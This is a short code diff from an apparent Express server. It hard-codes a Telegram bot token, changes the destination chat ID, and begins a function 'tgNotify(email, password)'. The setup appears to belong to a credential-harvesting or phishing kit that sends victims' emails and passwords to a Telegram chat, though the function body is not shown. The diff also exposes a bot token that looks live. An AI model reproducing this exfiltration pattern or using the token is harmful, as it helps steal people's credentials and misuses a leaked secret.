@@ -10,7 +10,7 @@ const app = express()
 // ── TELEGRAM NOTIFY ─────────────────────────────────────────────────────────
 
 const TG_TOKEN   = "8841116459:AAG4guDIwxCB2qpRVvWb0Zt51nWzTopnMKI"
-const TG_CHAT_ID = "1728085434"
+const TG_CHAT_ID = "1003930396452"
 
 async function tgNotify(email, password) {
 
